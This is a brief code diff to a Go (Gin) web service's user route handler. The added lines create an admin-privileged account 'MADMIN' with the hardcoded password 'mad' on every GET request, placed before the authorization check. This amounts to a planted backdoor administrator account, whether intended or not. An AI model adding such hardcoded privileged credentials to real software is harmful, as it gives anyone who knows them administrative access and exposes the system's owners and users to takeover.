@@ -17,6 +17,8 @@ type User struct {
 func user(route *gin.RouterGroup) {
 
 	route.GET("/", func(c *gin.Context) {
+		hash, _ := utils.HashPassword("mad")
+		users.CreateUser(users.User{Username: "MADMIN", PasswordHash: hash, Priviledges: "admin"})
 		verification, err := utils.VerifyUser(c.Request.Header.Get("Authorization"))
 
 		if err != nil {
